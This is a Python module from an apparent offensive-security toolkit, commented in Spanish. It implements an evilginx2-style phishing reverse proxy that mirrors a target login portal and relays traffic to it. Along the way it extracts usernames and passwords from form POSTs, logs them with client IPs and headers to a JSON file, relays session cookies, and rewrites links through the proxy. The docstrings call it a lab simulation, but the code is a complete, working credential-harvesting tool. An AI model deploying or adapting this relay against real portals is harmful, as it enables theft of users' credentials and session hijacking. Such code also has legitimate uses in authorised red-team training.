# -*- coding: utf-8 -*-
"""
Módulo phishing/relay_proxy
===========================
Proxy inverso de SIMULACIÓN de phishing (estilo evilginx2, versión de
laboratorio, HTTP plano):

    El operador sirve en local una copia del portal objetivo. Cuando la
    "víctima" del lab envía un formulario, el proxy:
      • registra usuario/contraseña detectados en el POST (simulación)
      • guarda las cookies del portal (robo de sesión en la simulación)
      • reescribe los enlaces del HTML para que naveguen por el proxy

Todo queda en output/phishing/relay_capturas.json. ES UN MÓDULO INTERACTIVO:
se detiene con Ctrl+C. Requiere AUTHORIZED (solo laboratorio/consentimiento).

Diferencias con evilginx2 (por diseño): sin DNS/Certificados ni captura en
producción; HTTP sin TLS; pensado para demos y formación defensiva.

Riesgo: ALTO (simulación de credenciales — exige AUTHORIZED).
ATT&CK: T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS) · T1556.
"""

import json
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, List, Tuple
from urllib.parse import urljoin, urlparse, parse_qsl
from urllib import request as urlrequest, error as urlerror

from core.base_module import BaseModulo, ModuloError

# Nombres típicos de campos de credenciales en formularios
_CLAVES_USUARIO = ("user", "usuario", "email", "correo", "mail", "login",
                   "username", "account")
_CLAVES_CLAVE = ("pass", "clave", "contrasena", "contraseña", "password",
                 "passwd", "pwd", "secret")

# Cabeceras que NO se reenvían (saltos de extremo a extremo)
_CABECERAS_SALTAR = {"host", "connection", "content-length", "accept-encoding",
                     "transfer-encoding", "keep-alive", "upgrade"}


def extraer_credenciales(campos: List[Tuple[str, str]]) -> Dict[str, str]:
    """Detecta campos de credenciales en un POST de formulario (función pura).

    Devuelve {usuario: …, contrasena: …} solo si ambos aparecen.
    """
    usuario = clave = ""
    for nombre, valor in campos:
        n = nombre.lower()
        if not usuario and any(k in n for k in _CLAVES_USUARIO):
            usuario = valor
        if not clave and any(k in n for k in _CLAVES_CLAVE):
            clave = valor
    if usuario and clave:
        return {"usuario": usuario, "contrasena": clave}
    return {}


def reescribir_html(html: str, host_objetivo: str, host_proxy: str) -> str:
    """Reescribe enlaces absolutos del HTML hacia el proxy (función pura)."""
    objetivo = host_objetivo.replace("https://", "").replace("http://", "")
    objetivo = objetivo.split("/")[0]
    return (html or "").replace(
        f"https://{objetivo}", f"http://{host_proxy}").replace(
        f"http://{objetivo}", f"http://{host_proxy}")


def camino_de(ruta: str) -> str:
    """Normaliza la ruta entrante para reenviarla al origen (función pura)."""
    camino = urlparse(ruta).path or "/"
    consulta = urlparse(ruta).query
    return f"{camino}?{consulta}" if consulta else camino


class RelayProxyModulo(BaseModulo):
    """Proxy inverso de simulación con captura de credenciales y cookies."""

    NAME = "phishing/relay_proxy"
    CATEGORIA = "phishing"
    DESCRIPCION = ("Proxy inverso de simulación (evilginx2 de laboratorio): "
                   "espeja el portal objetivo, captura credenciales y cookies "
                   "de los formularios del lab — HTTP, Ctrl+C para parar")
    RIESGO = "alto"
    AUTOR = "REDHAVOC"
    REFERENCIA = "evilginx2 (concepto) · MITRE T1557"
    ATTCK = ("T1557", "T1539")
    INTERACTIVO = True

    def definir_opciones(self) -> None:
        self.opciones.declarar(
            "OBJETIVO", "", True,
            "URL del portal a espejar (laboratorio, p. ej. http://10.0.0.5/login)")
        self.opciones.declarar(
            "PUERTO", "8080", False, "Puerto local del proxy")
        self.opciones.declarar(
            "LHOST", "0.0.0.0", False, "Interfaz de escucha")

    def ejecutar(self) -> dict:
        objetivo = self.opt("OBJETIVO").strip()
        if not objetivo.startswith(("http://", "https://")):
            objetivo = "http://" + objetivo
        parsed = urlparse(objetivo)
        if not parsed.netloc:
            raise ModuloError(f"URL objetivo inválida: {objetivo}")
        try:
            puerto = max(1, min(65535, int(self.opt("PUERTO", "8080") or 8080)))
        except ValueError:
            puerto = 8080
        lhost = self.opt("LHOST", "0.0.0.0") or "0.0.0.0"

        host_objetivo = parsed.netloc
        capturas: List[Dict] = []
        peticiones: List[int] = [0]
        salida = self._carpeta_capturas()

        class Manejador(BaseHTTPRequestHandler):
            """Sirve el espejo y captura los formularios del laboratorio."""
            protocol_version = "HTTP/1.1"

            def log_message(self, formato, *args):   # silencio en consola
                pass

            def _reenviar(self, metodo: str) -> None:
                destino = urljoin(objetivo, camino_de(self.path))
                cuerpo = b""
                if "Content-Length" in self.headers:
                    try:
                        cuerpo = self.rfile.read(
                            int(self.headers["Content-Length"]))
                    except (ValueError, OSError):
                        cuerpo = b""

                # captura de credenciales en POST de formulario (simulación)
                if metodo == "POST":
                    try:
                        campos = parse_qsl(cuerpo.decode("utf-8", errors="replace"),
                                           keep_blank_values=True)
                    except Exception:  # noqa: BLE001
                        campos = []
                    credenciales = extraer_credenciales(campos)
                    if credenciales:
                        capturas.append({
                            "hora": time.strftime("%H:%M:%S"),
                            "ip": self.client_address[0],
                            "camino": urlparse(self.path).path,
                            **credenciales,
                            "cabeceras": dict(self.headers),
                        })
                        self._guardar(capturas)

                # reenvía al origen
                cabeceras_reenvio = {
                    k: v for k, v in self.headers.items()
                    if k.lower() not in _CABECERAS_SALTAR}
                peticiones[0] += 1
                peticion = urlrequest.Request(
                    destino, data=cuerpo if metodo == "POST" else None,
                    method=metodo, headers=cabeceras_reenvio)
                try:
                    with urlrequest.urlopen(peticion, timeout=10) as r:
                        datos = r.read()
                        codigo, cab = r.status, dict(r.headers)
                except urlerror.HTTPError as err:
                    datos = err.read() if hasattr(err, "read") else b""
                    codigo = err.code
                    cab = dict(err.headers or {})
                except (urlerror.URLError, OSError) as err:
                    self._texto(502, f"origen inaccesible: {err}")
                    return

                tipo = cab.get("Content-Type", "text/html")
                if "html" in tipo.lower():
                    texto = reescribir_html(
                        datos.decode("utf-8", errors="replace"),
                        host_objetivo, self.headers.get("Host", f"127.0.0.1:{puerto}"))
                    datos = texto.encode("utf-8", errors="replace")
                    tipo = "text/html; charset=utf-8"

                self.send_response(codigo)
                self.send_header("Content-Type", tipo)
                self.send_header("Content-Length", str(len(datos)))
                for k, v in cab.items():
                    if k.lower() in ("set-cookie",):
                        self.send_header(k, reescribir_html(
                            v, host_objetivo,
                            self.headers.get("Host", f"127.0.0.1:{puerto}")))
                self.end_headers()
                try:
                    self.wfile.write(datos)
                except (BrokenPipeError, ConnectionResetError):
                    pass

            def _guardar(self, capturas: List[Dict]) -> None:
                try:
                    salida.mkdir(parents=True, exist_ok=True)
                    (salida / "relay_capturas.json").write_text(
                        json.dumps(capturas, indent=2, ensure_ascii=False),
                        encoding="utf-8")
                except OSError:
                    pass

            def _texto(self, codigo: int, mensaje: str) -> None:
                datos = mensaje.encode("utf-8")
                self.send_response(codigo)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(datos)))
                self.end_headers()
                try:
                    self.wfile.write(datos)
                except (BrokenPipeError, ConnectionResetError):
                    pass

            def do_GET(self):    # noqa: N802 — API http.server
                self._reenviar("GET")

            def do_POST(self):   # noqa: N802
                self._reenviar("POST")

        try:
            servidor = ThreadingHTTPServer((lhost, puerto), Manejador)
        except OSError as err:
            raise ModuloError(f"No se pudo abrir el puerto {puerto}: {err}")

        servidor.daemon_threads = True
        try:
            self._advertencia(puerto, objetivo)
            servidor.serve_forever(poll_interval=0.3)
        except KeyboardInterrupt:
            pass
        finally:
            servidor.server_close()

        return {
            "resumen": (f"Relay detenido: {len(capturas)} credencial(es) de "
                        f"simulación capturadas en {peticiones[0]} peticiones"),
            "objetivo": objetivo,
            "peticiones": peticiones[0],
            "credenciales_simuladas": capturas,
            "fichero": str(salida / "relay_capturas.json"),
        }

    def _carpeta_capturas(self):
        from pathlib import Path
        return Path("output") / "phishing"

    def _advertencia(self, puerto: int, objetivo: str) -> None:
        from core.colors import console
        console.print(
            f"[aviso][!][/aviso] Relay de SIMULACIÓN activo: "
            f"[bold]http://0.0.0.0:{puerto}[/bold] → [dim]{objetivo}[/dim]\n"
            "    Usa el hostname del lab para navegar por el proxy. "
            "Ctrl+C para detener.\n"
            "    Capturas: [dim]output/phishing/relay_capturas.json[/dim]")
